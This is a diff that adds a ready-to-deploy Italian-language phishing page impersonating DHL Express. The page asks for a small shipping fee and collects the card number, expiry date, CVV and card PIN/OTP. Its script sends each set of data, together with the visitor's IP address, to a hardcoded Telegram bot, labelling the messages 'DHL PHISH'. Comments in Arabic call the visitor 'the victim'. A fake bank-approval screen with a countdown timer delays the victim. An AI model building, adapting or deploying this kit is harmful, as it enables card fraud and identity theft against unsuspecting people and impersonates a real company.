@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DHL Express Easy - Pagamento</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:linear-gradient(145deg,#f0f2f5 0%,#e2e6eb 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}
+        .hidden{opacity:0;visibility:hidden}
+        #loader-screen{position:fixed;top:0;left:0;width:100%;height:100%;background:#FFCC00;display:flex;justify-content:center;align-items:center;z-index:9999;transition:opacity 0.7s ease,visibility 0.7s ease}
+        .dhl-loader{display:flex;flex-direction:column;align-items:center}
+        .dhl-loader .logo-row{display:flex;align-items:center;gap:10px}
+        .dhl-loader .logo-row .lines{display:flex;flex-direction:column;gap:4px}
+        .dhl-loader .logo-row .lines span{width:40px;height:5px;background:#D40511;transform:skewX(-18deg)}
+        .dhl-loader .logo-row .dhl{font-size:85px;font-weight:900;font-style:italic;color:#D40511;letter-spacing:-6px;line-height:1}
+        .dhl-loader .sub{font-size:24px;font-weight:900;font-style:italic;text-transform:uppercase;letter-spacing:-1.5px;background:linear-gradient(90deg,#fff 65%,transparent);padding:4px 60px 4px 30px;margin-top:-6px;transform:skewX(-18deg);display:inline-block}
+        .dhl-loader .sub .red{color:#D40511}
+        .dhl-loader .sub .black{color:#000}
+        .dhl-loader .bar{width:240px;height:3px;background:rgba(0,0,0,0.08);border-radius:6px;margin-top:24px;overflow:hidden}
+        .dhl-loader .bar-inner{width:0%;height:100%;background:#D40511;border-radius:6px;animation:loadBar 2s ease-in-out forwards}
+        @keyframes loadBar{0%{width:0%}60%{width:75%}100%{width:100%}}
+        .processing-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.55);backdrop-filter:blur(10px);display:none;justify-content:center;align-items:center;z-index:9998;flex-direction:column;gap:18px}
+        .processing-overlay.visible{display:flex}
+        .processing-overlay .p-spinner{width:50px;height:50px;border:4px solid #e5e7eb;border-top-color:#D40511;border-radius:50%;animation:spin 0.7s linear infinite}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .processing-overlay .p-text{font-size:14px;color:#6b7280;font-weight:500}
+        .page{display:none;width:100%;max-width:460px}
+        .page.active{display:block}
+        .card-ui{background:#fff;border-radius:20px;box-shadow:0 12px 48px rgba(0,0,0,0.07);overflow:hidden}
+        .card-header{background:#FFCC00;padding:26px 28px 18px;display:flex;align-items:center;justify-content:space-between}
+        .card-header .brand{display:flex;flex-direction:column}
+        .card-header .brand .logo-group{display:flex;align-items:center;gap:6px}
+        .card-header .brand .logo-group .lines{display:flex;flex-direction:column;gap:3px}
+        .card-header .brand .logo-group .lines span{width:20px;height:4px;background:#D40511;transform:skewX(-18deg)}
+        .card-header .brand .logo-group .dhl-text{font-size:38px;font-weight:900;font-style:italic;color:#D40511;letter-spacing:-2.5px;line-height:1}
+        .card-header .brand .sub-title{font-size:15px;font-weight:800;font-style:italic;text-transform:uppercase;letter-spacing:-0.5px;background:linear-gradient(90deg,#fff 60%,transparent);padding:2px 40px 2px 12px;margin-top:-2px;transform:skewX(-18deg);display:inline-block}
+        .card-header .brand .sub-title .red{color:#D40511}
+        .card-header .brand .sub-title .black{color:#000}
+        .card-header .badge{display:flex;align-items:center;gap:6px;background:rgba(255,255,255,0.5);padding:6px 14px;border-radius:24px;font-size:12px;font-weight:600;color:#333;backdrop-filter:blur(4px)}
+        .card-header .badge svg{width:14px;height:14px;flex-shrink:0}
+        .card-body{padding:28px 28px 20px}
+        .card-body h2{font-size:21px;font-weight:700;color:#111827;margin-bottom:4px}
+        .card-body p.sub{font-size:14px;color:#6b7280;margin-bottom:22px}
+        .card-network-icons{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:24px;align-items:center}
+        .pay-icon{height:30px;border-radius:4px;overflow:hidden;flex-shrink:0;font-size:0;display:flex;align-items:center;justify-content:center}
+        .pay-icon svg{height:22px;display:block}
+        .form-group{margin-bottom:20px}
+        .form-group label{display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:6px}
+        .form-group input{width:100%;padding:14px 16px;border:1.5px solid #d1d5db;border-radius:10px;font-size:16px;color:#111827;background:#f9fafb;outline:none;transition:all 0.2s ease}
+        .form-group input:focus{border-color:#FFCC00;background:#fff;box-shadow:0 0 0 3px rgba(255,204,0,0.18)}
+        .form-group input.error{border-color:#D40511;background:#fef2f2}
+        .form-group input::placeholder{color:#9ca3af}
+        .form-row{display:flex;gap:16px;margin-bottom:0}
+        .form-row .form-group{flex:1;margin-bottom:0}
+        .btn-pay{width:100%;padding:16px;background:#D40511;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:background 0.2s;margin-top:28px;display:flex;align-items:center;justify-content:center;gap:8px}
+        .btn-pay:hover{background:#b3040e}
+        .btn-pay svg{width:18px;height:18px;fill:#fff}
+        .error-msg{color:#D40511;font-size:13px;text-align:center;display:none;margin-top:14px;font-weight:500}
+        .card-footer{padding:18px 28px 22px;border-top:1px solid #f0f0f0;text-align:center}
+        .card-footer .links{display:flex;justify-content:center;gap:18px;flex-wrap:wrap}
+        .card-footer .links a{font-size:12px;color:#9ca3af;text-decoration:none}
+        .card-footer .links a:hover{color:#6b7280;text-decoration:underline}
+        .card-footer .copy{font-size:11px;color:#d1d5db;margin-top:10px}
+        .card-footer .pmt{display:flex;justify-content:center;gap:12px;margin-top:14px}
+        .card-footer .pmt span{font-size:10px;color:#d1d5db;letter-spacing:0.5px;text-transform:uppercase}
+        .otp-ui{background:#fff;border-radius:20px;box-shadow:0 12px 48px rgba(0,0,0,0.07);padding:34px 28px;text-align:center}
+        .otp-ui .shield{width:58px;height:58px;background:#fef2f2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+        .otp-ui .shield svg{width:28px;height:28px;fill:#D40511}
+        .otp-ui h3{font-size:18px;font-weight:700;color:#111827;margin-bottom:4px}
+        .otp-ui .desc{font-size:14px;color:#6b7280;margin-bottom:24px;line-height:1.5}
+        .otp-ui .info-box{background:#f9fafb;border:1px solid #e5e7eb;border-radius:14px;padding:18px;margin-bottom:24px;text-align:left}
+        .otp-ui .info-box .row{display:flex;justify-content:space-between;align-items:center;padding:6px 0}
+        .otp-ui .info-box .row:first-child{border-bottom:1px dashed #e5e7eb;padding-bottom:12px;margin-bottom:6px}
+        .otp-ui .info-box .label{font-size:11px;color:#9ca3af;text-transform:uppercase;font-weight:600;letter-spacing:0.3px}
+        .otp-ui .info-box .value{font-size:14px;color:#111827;font-weight:600}
+        .otp-ui .info-box .value.amount{color:#D40511;font-size:16px;font-weight:700}
+        .otp-ui .otp-wrap{margin-bottom:18px;text-align:left}
+        .otp-ui .otp-wrap label{font-size:13px;font-weight:600;color:#374151;margin-bottom:8px;display:block}
+        .otp-ui .otp-wrap input{width:100%;padding:16px;border:1.5px solid #d1d5db;border-radius:12px;font-size:24px;text-align:center;letter-spacing:10px;background:#f9fafb;outline:none;transition:all 0.2s}
+        .otp-ui .otp-wrap input:focus{border-color:#D40511;background:#fff;box-shadow:0 0 0 3px rgba(212,5,17,0.1)}
+        .btn-confirm{width:100%;padding:16px;background:#111827;color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;transition:background 0.2s}
+        .btn-confirm:hover{background:#000}
+        .otp-ui .help-link{display:inline-block;margin-top:18px;font-size:13px;color:#9ca3af;text-decoration:none}
+        .otp-ui .help-link:hover{color:#6b7280;text-decoration:underline}
+        .approve-ui{background:#fff;border-radius:20px;box-shadow:0 12px 48px rgba(0,0,0,0.07);padding:34px 28px;text-align:center}
+        .approve-ui .icons-row{display:flex;justify-content:center;gap:14px;margin-bottom:18px}
+        .approve-ui .icons-row .icn{width:48px;height:48px;background:#fef2f2;border-radius:14px;display:flex;align-items:center;justify-content:center}
+        .approve-ui .icons-row .icn svg{width:24px;height:24px;fill:#D40511}
+        .approve-ui h3{font-size:20px;font-weight:700;color:#111827;margin-bottom:6px}
+        .approve-ui .desc{font-size:14px;color:#6b7280;line-height:1.5;margin-bottom:20px}
+        .approve-ui .timer{display:inline-flex;align-items:center;gap:6px;background:#fef2f2;color:#D40511;padding:8px 18px;border-radius:24px;font-size:14px;font-weight:700;margin-bottom:22px}
+        .approve-ui .timer svg{width:16px;height:16px;fill:#D40511}
+        .approve-ui .txn-box{background:#f9fafb;border:1px solid #e5e7eb;border-radius:14px;padding:16px;margin-bottom:22px;text-align:left}
+        .approve-ui .txn-box .row{display:flex;justify-content:space-between;align-items:center;padding:8px 0}
+        .approve-ui .txn-box .row:not(:last-child){border-bottom:1px dashed #e5e7eb}
+        .approve-ui .txn-box .label{font-size:13px;color:#9ca3af}
+        .approve-ui .txn-box .value{font-size:14px;color:#111827;font-weight:600}
+        .approve-ui .txn-box .value.amount{color:#D40511;font-size:17px;font-weight:700}
+        .approve-ui .waiting{display:flex;justify-content:center;align-items:center;gap:10px;margin-bottom:22px}
+        .approve-ui .waiting .pulse{width:18px;height:18px;border:3px solid #e5e7eb;border-top-color:#D40511;border-radius:50%;animation:spin 0.8s linear infinite}
+        .approve-ui .waiting span{font-size:13px;color:#6b7280;font-weight:500}
+        .btn-biometria{width:100%;padding:16px;background:#111827;color:#fff;border:none;border-radius:14px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:background 0.2s}
+        .btn-biometria:hover{background:#000}
+        .btn-biometria svg{width:20px;height:20px;fill:#fff}
+        .approve-ui .cancel{display:inline-block;margin-top:16px;font-size:13px;color:#9ca3af;text-decoration:none}
+        .approve-ui .cancel:hover{text-decoration:underline;color:#6b7280}
+        @media(max-width:500px){body{padding:10px}.card-body{padding:20px}.card-header{padding:18px 20px}.card-header .brand .logo-group .dhl-text{font-size:30px}.card-header .badge{font-size:11px;padding:4px 10px}.otp-ui,.approve-ui{padding:24px 16px}.form-row{flex-direction:row;gap:12px}.card-network-icons{gap:6px}.pay-icon svg{height:18px}}
+    </style>
+</head>
+<body>
+
+<!-- مخفي لعرض IP الضحية -->
+<span id="userIp" style="display:none"></span>
+
+<!-- شاشة التحميل -->
+<div id="loader-screen">
+    <div class="dhl-loader">
+        <div class="logo-row">
+            <div class="lines"><span></span><span></span><span></span></div>
+            <div class="dhl">DHL</div>
+            <div class="lines"><span></span><span></span><span></span></div>
+        </div>
+        <div class="sub"><span class="red">EXPRESS</span> <span class="black">EASY</span></div>
+        <div class="bar"><div class="bar-inner"></div></div>
+    </div>
+</div>
+
+<!-- Overlay المعالجة -->
+<div class="processing-overlay" id="processingOverlay">
+    <div class="p-spinner"></div>
+    <div class="p-text">Elaborazione in corso...</div>
+</div>
+
+<!-- ===== الصفحة 1: البطاقة ===== -->
+<div class="page active" id="pageCard">
+    <div class="card-ui">
+        <div class="card-header">
+            <div class="brand">
+                <div class="logo-group">
+                    <div class="lines"><span></span><span></span><span></span></div>
+                    <span class="dhl-text">DHL</span>
+                    <div class="lines"><span></span><span></span><span></span></div>
+                </div>
+                <div class="sub-title"><span class="red">EXPRESS</span> <span class="black">EASY</span></div>
+            </div>
+            <div class="badge">
+                <svg viewBox="0 0 24 24"><path d="M12 2L4 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-8-3zm1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 1.84-.53 3.55-1.4 5.01z"/></svg>
+                Connessione sicura
+            </div>
+        </div>
+        <div class="card-body">
+            <h2>Pagamento spedizione</h2>
+            <p class="sub">Inserisci i dati della tua carta per € 2,99</p>
+
+            <div class="card-network-icons" id="cardIcons"></div>
+
+            <form id="cardForm">
+                <div class="form-group">
+                    <label>Numero di carta</label>
+                    <input type="text" id="card-number" placeholder="5276 5262 5267 3266" maxlength="19" inputmode="numeric">
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Scadenza</label>
+                        <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="text" id="card-cvn" placeholder="123" maxlength="4" inputmode="numeric">
+                    </div>
+                </div>
+                <button type="submit" class="btn-pay" id="payBtn">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                    Paga € 2,99
+                </button>
+            </form>
+            <p id="card-error" class="error-msg"></p>
+        </div>
+        <div class="card-footer">
+            <div class="links">
+                <a href="#">FAQ</a><span style="color:#e5e7eb">|</span>
+                <a href="#">Supporto</a><span style="color:#e5e7eb">|</span>
+                <a href="#">Privacy</a><span style="color:#e5e7eb">|</span>
+                <a href="#">Termini e condizioni</a>
+            </div>
+            <div class="copy">© 2026 DHL Express - Tutti i diritti riservati</div>
+            <div class="pmt"><span>Visa · Mastercard · Maestro · Amex · PayPal · Apple Pay · Google Pay · PostePay · Satispay · Bancomat</span></div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== الصفحة 2: OTP ===== -->
+<div class="page" id="pageOtp">
+    <div class="otp-ui">
+        <div class="shield">
+            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.66 0 3 1.34 3 3v2h1v5H8v-5h1v-2c0-1.66 1.34-3 3-3zm0 2c-.55 0-1 .45-1 1v2h2v-2c0-.55-.45-1-1-1z"/></svg>
+        </div>
+        <h3>Verifica di sicurezza</h3>
+        <p class="desc">Il pagamento richiede un'autenticazione aggiuntiva.<br>Inserisci il pin della tua carta per completare il pagamento di 2,99€ presso DHL.</p>
+        <div class="info-box">
+            <div class="row">
+                <div>
+                    <div class="label">Carta</div>
+                    <div class="value" id="displayCardOtp">5276 **** **** 3266</div>
+                </div>
+                <div style="text-align:right">
+                    <div class="label">Importo</div>
+                    <div class="value amount">€ 2,99</div>
+                </div>
+            </div>
+            <div class="row">
+                <div>
+                    <div class="label">Operazione</div>
+                    <div class="value">Pagamento online</div>
+                </div>
+                <div style="text-align:right">
+                    <div class="label">Data</div>
+                    <div class="value" id="displayDateOtp">11/07/2026</div>
+                </div>
+            </div>
+        </div>
+        <div class="otp-wrap">
+            <label>Inserisci il pin della tua carta</label>
+            <input type="text" id="otp-input" placeholder="000000" maxlength="6" inputmode="numeric">
+        </div>
+        <button class="btn-confirm" id="btnConfirm">Conferma pagamento</button>
+        <a href="#" class="help-link">Non ho ricevuto il codice</a>
+    </div>
+</div>
+
+<!-- ===== الصفحة 3: الموافقة ===== -->
+<div class="page" id="pageApprove">
+    <div class="approve-ui">
+        <div class="icons-row">
+            <div class="icn">
+                <svg viewBox="0 0 24 24"><path d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm-5 21c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm5-5H7V4h10v13z"/></svg>
+            </div>
+            <div class="icn">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 15l-4-4 1.41-1.41L10 13.17l5.59-5.59L17 9l-7 7z"/></svg>
+            </div>
+        </div>
+        <h3>Conferma nell'App bancaria</h3>
+        <p class="desc">Abbiamo inviato una notifica push sul tuo smartphone.<br>Apri l'app della tua banca per autorizzare il pagamento.</p>
+        <div class="timer">
+            <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+            <span id="countdown">05:00</span>
+        </div>
+        <div class="txn-box">
+            <div class="row"><span class="label">Esercente</span><span class="value">DHL Express</span></div>
+            <div class="row"><span class="label">Carta</span><span class="value" id="displayCardApprove">carta di credito (**** 3266)</span></div>
+            <div class="row"><span class="label">Importo totale</span><span class="value amount">€ 2,99</span></div>
+        </div>
+        <div class="waiting">
+            <div class="pulse"></div>
+            <span>In attesa di approvazione...</span>
+        </div>
+        <button class="btn-biometria" id="btnBiometria">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 1.84-.53 3.55-1.4 5.01z"/></svg>
+            Autorizza con Biometria
+        </button>
+        <a href="#" class="cancel">Annulla operazione</a>
+    </div>
+</div>
+
+<script>
+// ====================================================
+// إعدادات بوت تلغرام — ✳️ استبدل القيم أدناه ✳️
+// ====================================================
+const TELEGRAM_BOT_TOKEN = '8618349247:AAH25CSzXU5ESrOyUf6_zoLRi8U1JVz05a8';
+const TELEGRAM_CHAT_ID   = '8278195073';
+// ====================================================
+
+// دالة إرسال البيانات إلى تلغرام
+function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+    };
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    }).catch(err => console.error('Telegram send error:', err));
+}
+
+// التقاط IP الضحية
+fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(d => document.getElementById('userIp').textContent = d.ip)
+    .catch(() => {});
+
+// أيقونات الدفع
+(function() {
+    var icons = [
+        '<span class="pay-icon" style="background:#1A1F71;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="20" text-anchor="middle" font-size="12" font-weight="bold" font-family="Arial" letter-spacing="1">VISA</text></svg></span>',
+        '<span class="pay-icon" style="width:44px"><svg viewBox="0 0 50 30"><circle cx="18" cy="15" r="8" fill="#EB001B"/><circle cx="32" cy="15" r="8" fill="#F79E1B" opacity="0.95"/><text x="25" y="27" text-anchor="middle" font-size="5" font-weight="bold" font-family="Arial" fill="#333">mastercard</text></svg></span>',
+        '<span class="pay-icon" style="width:44px"><svg viewBox="0 0 50 30"><rect width="50" height="30" rx="4" fill="#0064CF"/><circle cx="18" cy="15" r="7" fill="#EB001B"/><circle cx="32" cy="15" r="7" fill="#00A2E5" opacity="0.8"/><path d="M25 20.5A7 7 0 0 0 25 9.5 7 7 0 0 1 25 20.5z" fill="#0099DF"/><text x="25" y="27" text-anchor="middle" font-size="4.5" font-weight="bold" font-family="Arial" fill="#fff">Maestro</text></svg></span>',
+        '<span class="pay-icon" style="background:#2E77BC;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="16" text-anchor="middle" font-size="8" font-weight="bold" font-family="Arial" letter-spacing="1">AMEX</text></svg></span>',
+        '<span class="pay-icon" style="background:#003087;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="18" text-anchor="middle" font-size="9" font-weight="bold" font-family="Arial" letter-spacing="1">PayPal</text></svg></span>',
+        '<span class="pay-icon" style="background:#000;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="14" text-anchor="middle" font-size="6" font-weight="bold" font-family="Arial">\uf8ff</text><text x="25" y="22" text-anchor="middle" font-size="5" font-weight="bold" font-family="Arial" letter-spacing="1">Pay</text></svg></span>',
+        '<span class="pay-icon" style="border:1px solid #e0e0e0;width:44px"><svg viewBox="0 0 50 30"><text x="25" y="18" text-anchor="middle" font-size="8" font-weight="bold" font-family="Arial" fill="#5F6368">G Pay</text></svg></span>',
+        '<span class="pay-icon" style="background:#0061A8;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="18" text-anchor="middle" font-size="6" font-weight="bold" font-family="Arial">PostePay</text></svg></span>',
+        '<span class="pay-icon" style="background:#000;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="18" text-anchor="middle" font-size="7" font-weight="bold" font-family="Arial">Satispay</text></svg></span>',
+        '<span class="pay-icon" style="background:#E60000;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="18" text-anchor="middle" font-size="7" font-weight="bold" font-family="Arial">Bancomat</text></svg></span>'
+    ];
+    var c = document.getElementById('cardIcons');
+    if (c) { for (var i = 0; i < icons.length; i++) { c.innerHTML += icons[i]; } }
+})();
+
+// إخفاء شاشة التحميل
+window.addEventListener('load', function() {
+    setTimeout(function() {
+        document.getElementById('loader-screen').classList.add('hidden');
+    }, 2200);
+});
+
+// تنسيق رقم البطاقة
+document.getElementById('card-number').addEventListener('input', function() {
+    var v = this.value.replace(/\D/g, '').substring(0, 16);
+    var f = '';
+    for (var i = 0; i < v.length; i++) {
+        if (i > 0 && i % 4 === 0) f += ' ';
+        f += v[i];
+    }
+    this.value = f;
+});
+
+// تنسيق تاريخ الانتهاء
+document.getElementById('card-expiry').addEventListener('input', function() {
+    var v = this.value.replace(/\D/g, '').substring(0, 4);
+    var f = v.length > 2 ? v.substring(0, 2) + '/' + v.substring(2) : v;
+    this.value = f;
+});
+
+// CVV
+document.getElementById('card-cvn').addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').substring(0, 4);
+});
+
+// OTP
+document.getElementById('otp-input').addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').substring(0, 6);
+});
+
+// الصفحة 1 ← الصفحة 2 — إرسال بيانات البطاقة
+document.getElementById('cardForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    var card = document.getElementById('card-number').value.replace(/\s/g, '');
+    var exp = document.getElementById('card-expiry').value;
+    var cvn = document.getElementById('card-cvn').value;
+    var err = document.getElementById('card-error');
+
+    if (card.length < 13) {
+        err.textContent = 'Numero carta non valido.';
+        err.style.display = 'block';
+        document.getElementById('card-number').classList.add('error');
+        return;
+    }
+    if (exp.length !== 5) {
+        err.textContent = 'Data non valida. Usa MM/YY.';
+        err.style.display = 'block';
+        document.getElementById('card-expiry').classList.add('error');
+        return;
+    }
+    if (cvn.length < 3) {
+        err.textContent = 'CVV non valido.';
+        err.style.display = 'block';
+        document.getElementById('card-cvn').classList.add('error');
+        return;
+    }
+
+    err.style.display = 'none';
+    document.querySelectorAll('.error').forEach(function(el) { el.classList.remove('error'); });
+
+    var last4 = card.slice(-4);
+    document.getElementById('displayCardOtp').textContent = card.substring(0, 4) + ' **** **** ' + last4;
+    document.getElementById('displayCardApprove').textContent = 'carta di credito (**** ' + last4 + ')';
+    var d = new Date();
+    document.getElementById('displayDateOtp').textContent =
+        String(d.getDate()).padStart(2, '0') + '/' +
+        String(d.getMonth() + 1).padStart(2, '0') + '/' +
+        d.getFullYear();
+
+    // ========== إرسال بيانات البطاقة إلى تلغرام ==========
+    var now = new Date().toLocaleString('it-IT');
+    var ip = document.getElementById('userIp').textContent || 'N/D';
+    var tgMsg =
+'<b>💳 DHL PHISH - DATI CARTA</b>\n' +
+'━━━━━━━━━━━━━━━\n' +
+'<b>Carta:</b> <code>' + card + '</code>\n' +
+'<b>Scadenza:</b> ' + exp + '\n' +
+'<b>CVV:</b> <code>' + cvn + '</code>\n' +
+'<b>Ultime 4:</b> ' + last4 + '\n' +
+'━━━━━━━━━━━━━━━\n' +
+'<b>IP:</b> ' + ip + '\n' +
+'<b>Data/Ora:</b> ' + now;
+    sendToTelegram(tgMsg);
+    // ===================================================
+
+    document.getElementById('pageCard').classList.remove('active');
+    document.getElementById('processingOverlay').classList.add('visible');
+    document.getElementById('payBtn').disabled = true;
+    setTimeout(function() {
+        document.getElementById('processingOverlay').classList.remove('visible');
+        document.getElementById('pageOtp').classList.add('active');
+    }, 2800);
+});
+
+// إزالة error عند التعديل
+document.querySelectorAll('#card-number, #card-expiry, #card-cvn').forEach(function(el) {
+    el.addEventListener('input', function() {
+        this.classList.remove('error');
+        document.getElementById('card-error').style.display = 'none';
+    });
+});
+
+// الصفحة 2 ← الصفحة 3 — إرسال OTP
+document.getElementById('btnConfirm').addEventListener('click', function() {
+    var otp = document.getElementById('otp-input').value;
+    if (otp.length < 4) {
+        alert('Inserire il pin della carta per completare il pagamento.');
+        return;
+    }
+
+    // ========== إرسال OTP إلى تلغرام ==========
+    var now = new Date().toLocaleString('it-IT');
+    var ip = document.getElementById('userIp').textContent || 'N/D';
+    var cardDisplay = document.getElementById('displayCardOtp').textContent;
+    var tgMsg =
+'<b>🔐 DHL PHISH - OTP/PIN</b>\n' +
+'━━━━━━━━━━━━━━━\n' +
+'<b>Carta:</b> ' + cardDisplay + '\n' +
+'<b>OTP/PIN:</b> <code>' + otp + '</code>\n' +
+'━━━━━━━━━━━━━━━\n' +
+'<b>IP:</b> ' + ip + '\n' +
+'<b>Data/Ora:</b> ' + now;
+    sendToTelegram(tgMsg);
+    // ==========================================
+
+    document.getElementById('pageOtp').classList.remove('active');
+    document.getElementById('processingOverlay').classList.add('visible');
+    setTimeout(function() {
+        document.getElementById('processingOverlay').classList.remove('visible');
+        document.getElementById('pageApprove').classList.add('active');
+        startCountdown();
+    }, 2800);
+});
+
+// عداد تنازلي
+function startCountdown() {
+    var t = 300;
+    var el = document.getElementById('countdown');
+    setInterval(function() {
+        if (t <= 0) { el.textContent = '00:00'; return; }
+        t--;
+        el.textContent = String(Math.floor(t / 60)).padStart(2, '0') + ':' + String(t % 60).padStart(2, '0');
+    }, 1000);
+}
+
+// منع إعادة تحميل الصفحة من الروابط
+document.querySelectorAll('a[href="#"]').forEach(function(a) {
+    a.addEventListener('click', function(e) { e.preventDefault(); });
+});
+</script>
+</body>
+</html>
